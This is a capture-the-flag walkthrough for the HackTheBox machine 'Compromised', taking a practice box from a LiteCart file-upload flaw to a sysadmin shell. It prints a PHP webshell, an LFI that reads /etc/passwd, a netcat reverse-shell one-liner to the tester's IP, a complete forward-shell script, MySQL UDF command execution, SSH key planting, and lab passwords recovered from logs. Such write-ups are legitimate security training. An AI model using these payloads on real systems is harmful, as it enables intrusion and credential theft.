---
title: "Compromised HackTheBox Writeup" 
last_modified_at: 2021-1-23T2:35:02-05:00
categories:
  - htb
author_profile: false
tags:
  - nmap
  - wfuzz
  - forward shell
  - Arbitary file upload
  - Php disabled functions bypass
  - mysql udf
  - linux pam backdoors
  - SUID
  - linux
  - privilege Escalation
  - iptables
---

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


![compromised](/assets/images/htb-boxes/compromised.png)

Compromised is a hard Linux box by [D4nch3n](https://www.hackthebox.eu/home/users/profile/103781). First on Port 80, LiteCart was running and had a backup for the webserver leading to a file containing admin's username and password. The version of LiteCart was vulnerable to arbitary file uploading and using the credentials, php scripts was uploaded to the server but most of the dangerous function were all disabled which were bypassed to run commands on the box as www-data. As the box was compromised, there were backdoors on the box. Using the backdoor on mysql, I was able to get a shell as mysql and credentials for another user sysadmin was found on a log file. And at last, a pam library file was reversed to get the password for root user. 

# Port Scan

```console
local@local:~/Documents/htb/boxes/compromised$ nmap -sC -sV -oN nmap/initial 10.10.10.207
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDTdyzps+EGggiAkP1TRZaSqrxkfupsb22iTn6m4y0OPxwBh1lOZdS+k0GkObYCwUyVLdbizi5MyehX5towah/MNJRbTXQYMWRHq9R6agtHQ/wVxKDarQStRcUQrVEOs+yK7olQXFiqYQlv0aNbx26YV9Ogs1T+KQlHmeCE0Cb5fR1u7phhSQkxC1F7U2cbwXauGjOT8wQn3lNbyIzealooAp2SJbGmmvXUCQxhlNvboi1B4GfOGVeA+PzN/mUxqdj8JPvqS+oILsyTbtUXdpl16Hg5wLqcqo5CBVc4nFFfRpobXndIVmKd6E5egJFC2X7kOwZMhoD9n2JLRNSh+pp
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHw5x8ksVTxgNM3Q2TxEm20DpKhq2rkmALsX2/O7CB0d4LWQRa4E2SlHJJ9HDrlGlf9qwzIDkeT2qWQ9GuoFX5c=
|   256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEu0c6bJTNWuXAtzU4dym2DBQAG0rWBBm2Srq9j7haTI
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FD8AFB6FFE392F9ED98CC0B1B37B9A5D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.129.8.151/shop/en/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Only two ports are open. SSH is running on port 22 and a HTTP service on port 80.

# Port 80

![1](/assets/images/compromised/1.png)

Looking at the page, it is running LiteCart which is a lightweight e-commerce platform for online merchants and developed in PHP, HTML 5, and CSS 3.

## Checking for Public Exploit using searchsploit

```console
local@local:~/Documents/htb/boxes/compromised$ searchsploit litecart
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload                                                                                                        | php/webapps/45267.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
There is a publicly available exploit for the version 2.1.2 and going through the exploit it was released on 2018-08-27 and is an authenticated exploit requiring an admin's username and  password. At this point, we neither know the version of LiteCart running nor the login credentials.

## Directory Busting
```console
local@local:~/Documents/htb/boxes/compromised$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 -c http://10.10.10.207/FUZZ
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.207/FUZZ
Total requests: 220547

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                         
===================================================================

000000213:   301        9 L      28 W     311 Ch      "shop"                                                                                                                          
000001613:   301        9 L      28 W     313 Ch      "backup" 
```
We found a interesting backup directory.

### Checking /backup

![2](/assets/images/compromised/2.png)
This directory consists a compressed file which might be the backup of the webserver. Lets download this file to our local box.

### Downloading a.tar.gz
```console
local@local:~/Documents/htb/boxes/compromised$ wget http://10.10.10.207/backup/a.tar.gz
```
### Extracting the contents
```console
local@local:~/Documents/htb/boxes/compromised$ tar xvf a.tar.gz
```

### Checking the contents
```console
local@local:~/Documents/htb/boxes/compromised/shop$ ls
admin  cache  data  ext  favicon.ico  images  includes  index.php  logs  pages  robots.txt  vqmod
```
Looking through the files from the backup, I found something interesting in `admin/login.php` file.
```console
local@local:~/Documents/htb/boxes/compromised/shop/admin$ cat login.php | grep -i file_put
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```
The file `login.php` has a commented php code which puts the username and the password to a file **.log2301c9430d8593ae.txt**. So lets check if that file exists on the server.

```console
local@local:~/Documents/htb/boxes/compromised/shop/admin$ curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt 
User: admin Passwd: theNextGenSt0r3!~
```
And it does exist and we get a username and a password. So lets try to login into the admin panel with this username and password.

### Logging in
![3](/assets/images/compromised/3.png)

And we successfully login as an admin.  
  

![4](/assets/images/compromised/4.png)

And also on the same page, I found the version of LiteCart is **2.1.2** which is vulnerable to arbitary file upload.  
  

![5](/assets/images/compromised/5.png)

## Running the exploit
Going through the exploit, I found that we could upload a New vQmod file which the webserver expects to be a xml file and also has some checks to ensure that but can be easily bypassed by changing the Content-Type to  **application/xml**. So let us upload a php file `shell.php`.
### Contents of shell.php
```php
<?php
echo "File is successfully uploaded";
echo system($_REQUEST['cmd']);
?>
```

### Uploading the file and intercepting with Burp

![6](/assets/images/compromised/6.png)

After the **Content-Type** was changed to **application/xml**, the file was successfully uploaded.  
  

![7](/assets/images/compromised/7.png)

### Checking the uploaded file
Reading through the exploit, I found the files are uploaded to `http://10.10.10.207/shop/vqmod/xml/shell.php`. So let us check if the file exists.

```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php
File is successfully uploaded
```
The file exists and the content is echoed out, which means the php code is executed on the back end.

Let us try to run commands now.
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php?cmd=whoami
File is successfully uploaded
```
But I was not able to run commands. Looks like the function `system` is disabled on the box.

### Listing out the disabled functions
Let us upload another file to with following contents.
```php
<?php
phpinfo();
?>
```
This file is also uploaded using the method above by changing the Content-Type.

And from the output of the phpinfo, following commands are seem to be disabled on the box.
```php
system
passthru
popen
shell_exec
proc_open
exec
fsockopen
socket_create
curl_exec
curl_multi_exec
mail
putenv
imap_open
parse_ini_file
show_source
file_put_contents
fwrite
pcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wifcontinued
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_get_handler
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
pcntl_async_signals
```
Almost all commands that are used to execute shell commands are disabled. But `include` is not in this list, so we can include any files that are on the web server that can be read by www-data.

## Local File Inclusion
I uploaded another file with following contents.
```php
<?php
include($_REQUEST['filename']);
?>
```
### Getting the content of /etc/passwd
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php?filename=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
```
Now we can read any file from the server, which the account that is running the webserver has read access to.  
Also from the output of the /etc/passwd, I noticed that mysql which is a service account has **/bin/bash** as its login shell which is a little unusual.
I played with this LFI for a while and tried blindly to pull the private key for users like sysadmin and mysql but was not successful. So I focused on bypassing the disabled functions and found [this](https://www.exploit-db.com/exploits/47462) exploit.

### Bypassing disabled functions
So lets download the exploit from exploit-db and upload this exploit to the webserver.
```console
local@local:~/Documents/htb/boxes/compromised$ wget https://www.exploit-db.com/raw/47462
local@local:~/Documents/htb/boxes/compromised$ mv 47462 shell.php
```
And after uploading if we hit the page, we get code execution.
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php
Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
Now that we have got code execution, let us try to get a reverse shell.

### Changing the content of shell.php
```console
local@local:~/Documents/htb/boxes/compromised$ sed -i 's/pwn("uname -a")/pwn($_REQUEST["cmd"])/g' shell.php
```
Now after uploading, we can execute commands.
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php -d 'cmd=ls -la'
total 20
drwxr-xr-x 2 www-data www-data 4096 Oct  8 15:15 .
drwxr-xr-x 4 root     root     4096 May 29 05:00 ..
-rw-r--r-- 1 root     root        0 May 14  2018 index.html
-rw-r--r-- 1 www-data www-data   20 Oct  8 15:15 phpinfo.php
-rw-r--r-- 1 www-data www-data 6018 Oct  8 15:39 shell.php
```
## Trying to get a reverse shell
### Listing on our box
```console
local@local:~/Documents/htb/boxes/compromised$ sudo nc -nvlp 80
Listening on [0.0.0.0] (family 2, port 80)
Listening on 0.0.0.0 80
```
### Executing the payload
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php -d 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.48 80 >/tmp/f'
```
But we do not get a connection back. And I tried this with different reverse shell payloads but I did not get the connection back. So I decided to take a step back and try to ping my box.

### Listening for connection on tun0 interface
```console
local@local:~/Documents/htb/boxes/compromised$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
```
### Executing ping 
```console
local@local:~/Documents/htb/boxes/compromised$ curl http://10.10.10.207/shop/vqmod/xml/shell.php -d 'cmd=ping 10.10.14.48'
```
But there was no response. So I guessed there must be some firewall or iptable rules that is blocking the outgoing connection. So I decided to use [forward shell](https://github.com/IppSec/forward-shell) made by Ippsec.

## Forward Shell

### Cloning the repo
```console
local@local:~/Documents/htb/boxes/compromised$ git clone https://github.com/IppSec/forward-shell
Cloning into 'forward-shell'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 1), reused 6 (delta 1), pack-reused 0
Unpacking objects: 100% (9/9), done.
```
And we make the changes to the script.
### Content of forward-shell.py
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf


import base64
import random
import requests
import threading
import time

class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        # MODIFY THIS, URL
        self.url = r"http://10.10.10.207/shop/vqmod/xml/shell.php"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)
        
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        #print(f"Going to run cmd: {cmd}")
        # MODIFY THIS: This is where your payload code goes
        data = { 'cmd' : cmd}

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}
       
        # MODIFY THIS: Payload in User-Agent because it was used in ShellShock
        headers = {'User-Agent': 'test'}
        try:
            r = requests.post(self.url, headers=headers,data=data, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

prompt = "Forward Shell> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
```
Now let us run the script.
```console
local@local:~/Documents/htb/boxes/compromised/forward-shell$ python3 forward-shell.py 
[*] Session ID: 62514
[*] Setting up fifo shell on target
[*] Setting up read thread
Forward Shell> pwd   
/var/www/html/shop/vqmod/xml

Forward Shell>cd ..
Forward Shell> pwd
/var/www/html/shop/vqmod
Forward Shell> upgrade
www-data@compromised:/var/www/html/shop/vqmod$ 
```
Now we get a persistent shell and I also used `upgrade` command to upgrade our shell. 

Even though we got a persistent shell, I tried to get a reverse shell using ipv6. But the interfaces did not have ipv6 addresses.
```console
www-data@compromised:~# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.207  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:c1:57  txqueuelen 1000  (Ethernet)
        RX packets 958415  bytes 137954834 (137.9 MB)
        RX errors 0  dropped 592  overruns 0  frame 0
        TX packets 656906  bytes 315320985 (315.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Becoming satisfied with what I had, I moved on with my enumeration.

# Privilege Escalation
While I was enumerating, I found a interesting file **index.html** on **/var/www**.
```html
<title>Pwned!</title>                                                                                                                                                                            
<body style="background-color:yellow;">                                                                                                                                                          
<pre style="color:green;">                                                                                                                                                                       
#################################################################################################################################################                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                 This shop has been seized until security improves                                             #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                  Oh, and don't even think about restoring from backups. We are in everything you own.                         #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                     [$(5)$]                                                                   #                                                
#                                                              [$(5)$][$(5)$][$(5)$]                                                            #                                                
#                                                          [$(5)$]    [$(5)$]    [$(5)$]                                                        #                                                
#                                                        [$(5)$]      [$(5)$]      [$(5)$]                                                      #                                                
#                                                       [$(5)$]       [$(5)$]       [$(5)$]                                                     #                                                
#                                                       [$(5)$]       [$(5)$]    [$(5)$][$(5)$]                                                 #                                                
#                                                        [$(5)$]      [$(5)$]                                                                   #                                                
#                                                          [$(5)$]    [$(5)$]                                                                   #                                                
#                                                              [$(5)$][$(5)$]                                                                   #                                                
#                                                              [$(5)$][$(5)$][$(5)$]                                                            #                                                
#                                                                     [$(5)$][$(5)$]                                                            #                                                
#                                                                     [$(5)$]    [$(5)$]                                                        #                                                
#                                                                     [$(5)$]      [$(5)$]                                                      #                                                
#                                                   [$(5)$][$(5)$]    [$(5)$]       [$(5)$]                                                     #                                                
#                                                       [$(5)$]       [$(5)$]       [$(5)$]                                                     #                                                
#                                                        [$(5)$]      [$(5)$]      [$(5)$]                                                      #                                                
#                                                          [$(5)$]    [$(5)$]    [$(5)$]                                                        #                                                
#                                                              [$(5)$][$(5)$][$(5)$]                                                            #                                                
#                                                                     [$(5)$]                                                                   #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#                                                                                                                                               #                                                
#################################################################################################################################################                                                
</pre>  
       
```
This says the web server has been compromised and also says that the owner can not get rid of the attacker even after restoring the system from the backup which means that the attacker must have left a backdoor for them to come back later.

From the output of **/etc/passwd** earlier, there was an unusual entry for service user **mysql**. So let us check that out.

## Horizontal Escalation as user mysql
### Extracting mysql database information
```console
ww-data@compromised:/var/www/html/shop$ 
grep -Ri password -B3 -A2 includes/config.inc.php
<$ grep -Ri password -B3 -A2 includes/config.inc.php
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
--
    ini_set('display_errors', 'On');
  }

// Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```
### Logging into mysql database
```console
www-data@compromised:/var/www/html/shop$ 
mysql -u root -p
mysql -u root -p
Enter password: 
changethis

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 67
Server version: 5.7.30-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
And thanks to Ippsec's persistent forward shell, we can log into mysql database.

I did not have an idea how to create a backdoor with mysql service account and I found many posts about user defined functions **(UDF)** on mysql which allows us to execute commands as the user who is running the mysql daemon.
```console
www-data@compromised:/var/www/html/shop/vqmod/xml$ 
ps -ef | grep -i mysql
mysql      1232      1  0 04:55 ?        00:00:22 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```
And the mysql daemon is running as user mysql.

For this type of exploit to work, we have to create a malicious library file with our user defined function to execute shell commands and write it on the **plugin directory**.

### Listing plugin directory
```sql
mysql> 
select @@plugin_dir;
select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)
```
### Checking if we can write on plugin_dir
```sql
mysql> select * from mysql.user into outfile '/usr/lib/mysql/plugin/user.log';
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
The mysql daemon was started with **--secure-file-priv** which means we can not write on that folder.
Then I thought as the attacker was already on the box, he/she might have created a UDF to execute shell commands as user mysql.

### Listing functions 
```sql
mysql> 
select * from mysql.func;
+----------+-----+-------------+----------+
| name     | ret | dl          | type     |
+----------+-----+-------------+----------+
| exec_cmd |   0 | libmysql.so | function |
+----------+-----+-------------+----------+
1 row in set (0.00 sec)
```
And there was a function called **exec_cmd** on the dl file **libmysql.so**.

### Getting shell as mysql
```sql
mysql> 
select exec_cmd('whoami');
`+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| mysql
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.02 sec)
```
We are now running commands as user mysql.

### Generating key pairs on local box
```console
local@local:~/Documents/htb/boxes/compromised$ ssh-keygen -f mysql
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in mysql.
Your public key has been saved in mysql.pub.
The key fingerprint is:
SHA256:RWUkCU7pNLaH3Yi+7gozvbIRh675rWUo52ptBKyBeWA local@local
The key's randomart image is:
+---[RSA 3072]----+
|        ooo++    |
|.E     o=..o     |
|o+     +.*.o     |
|+ +  .  =.+ .    |
| + .o ..S.       |
|.  ..=  .        |
|  .oO +  .       |
|  .*+O ..        |
| .++=+++o        |
+----[SHA256]-----+
```
### Writing public key to .ssh/authorized file
```sql
mysql>                                                                                    
select exec_cmd('mkdir /var/lib/mysql/.ssh'); 
select exec_cmd("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSlTdZqwoHmaLbw47hJMmTFII170oByPXiY/HL8gDOyoJOeEYC3PWCcz39aNbkanv5RxLMBAm6XIyHaZeHEn4+JBjMcYUrqZkpdA/dOWavpDiT5FXJqOORuV/Q3m+0486dj3
i2sQG97ZPkKdZV4LdNmsce4+xXDYFE5wBkmhSvNluUgpKFS919HP8Z17kYL8FGDlFytbYN43fiNzD0sRh8Ot3M90u45fETbNG/if4BGhZ7cwGoXA/c2xWltcVkMrts+UpFvMDl/nRrED8OxDEhl5R6h71EW+j5ipOkynfziYI/xnqbB/sVGze+yxNmjJpVVOq
RTn020+AoxIekPTGA+F5rTaVq5Cr1tQPCKvF65lUeZyVIA44nhbDIog0tdWVEKH0YdP8H23O18eukcd6VrV7FMvfNIPvXN0nJb/BdtZwxTAYYqW8kYfWUmnKiUFJb+xUJmnvgUHjZ0v/SC/hnxBxMS9XIzXOhZE9CBeaQFhcnppJBCvapx20gBjqXoR0=' > 
.ssh/authorized_keys");
```
Now let us try to login on the box as user mysql using the private key that we generated earlier.

```console
local@local:~/Documents/htb/boxes/compromised$ ssh -i mysql mysql@10.10.10.207
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ 
```
And we log in as mysql user.

## Horizontal Privilege Escalation to user sysadmin
On the home folder of user mysql there was an interesting file.
```console
mysql@compromised:~$ ls -la strace-log.dat 
-r--r----- 1 root mysql 787180 May 13 02:10 strace-log.dat
```

```console
mysql@compromised:~$ grep -Ri password strace-log.dat 
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22228 03:11:15 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changeme"], 0x55bc62467900 /* 21 vars */) = 0
22228 03:11:15 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:16 write(2, "mysql -u root --password='change"..., 35) = 35
22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
22229 03:11:18 write(2, "[Warning] Using a password on th"..., 73) = 73
22232 03:11:52 openat(AT_FDCWD, "/etc/pam.d/common-password", O_RDONLY) = 5
22232 03:11:52 read(5, "#\n# /etc/pam.d/common-password -"..., 4096) = 1440
22232 03:11:52 write(4, "[sudo] password for sysadmin: ", 30) = 30
```
And I got two extra passwords.
```
3*NLJE32I$Fe
changeme
```
Then I checked if the user sysadmin or root has this password.
```console
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ 
```
An it turns out that it was sysadmin's password.

# Reading user.txt
```console
sysadmin@compromised:/var/lib/mysql$ cd ~
sysadmin@compromised:~$ cat user.txt 
c93b************************3652
```

# Privilege Escalation to root
Once again thinking that the attacker might have left the backdoor, I began tracing the attackers step on the box. By taking the reference of the index.html, I started finding files modified around that date.
```console
sysadmin@compromised:~$ ls -la /var/www/index.html 
-rw-r--r-- 1 root root 5659 May 28 06:05 /var/www/index.html
```
As the file was modified on **May 28**, thinking the attacker might have placed the backdoor before defacing the website, I searched for files that the attacker might have modified but I did not find anything interesting around that date.

So I searched around on internet to find the different ways to leave a backdoor on a system. 

### Entry on Sudoers file
```console
sysadmin@compromised:~$ sudo -l
sudo: unable to resolve host compromised: Resource temporarily unavailable
[sudo] password for sysadmin: 
Sorry, user sysadmin may not run sudo on compromised.
```

### SUID binaries
```console
sysadmin@compromised:~$ find / -type f -perm -4000 -newermt 2020-01-01 -ls 2>/dev/null
   132614     28 -rwsr-xr-x   1 root     root        26696 Mar  5  2020 /bin/umount
   132572     44 -rwsr-xr-x   1 root     root        43088 Mar  5  2020 /bin/mount
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/9066/bin/mount
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/9066/bin/umount
     2963    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo
     6470    109 -rwsr-xr-x   1 root     root       110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
     7646    386 -rwsr-xr--   1 root     dip        394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd
  1180479    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
  ```
  The SUID bit with the latest modification date is **mount** and **umount**.
  And I checked the date on my local machine for mount and umount.
  ```console
  local@local:~/Documents/htb/boxes/compromised$ ls -la /bin/mount
-rwsr-xr-x 1 root root 55528 Mar  5  2020 /bin/mount
```
And the date was same on both cases.

### Cron jobs
I uploaded [pspy](https://github.com/DominicBreuker/pspy) to the box using scp and analysed for some time if there was a cron job doing something for a backdoor but did not find anything.

### Linux PAM Backdoor
Linux-PAM (short for Pluggable Authentication Modules which evolved from the Unix-PAM architecture) is a powerful suite of shared libraries used to dynamically authenticate a user to applications (or services) in a Linux system.  

As the shared libraries are used for authentication, an attacker can modify the shared libraries to alter the logic for authentication. And I found [this](https://github.com/zephrax/linux-pam-backdoor) repo on github with script to make a linux pam backdoor which makes change to the **pam_unix.so** file. 
```console
sysadmin@compromised:~$ locate pam_unix.so
/lib/x86_64-linux-gnu/security/.pam_unix.so
/lib/x86_64-linux-gnu/security/pam_unix.so
/snap/core/8268/lib/x86_64-linux-gnu/security/pam_unix.so
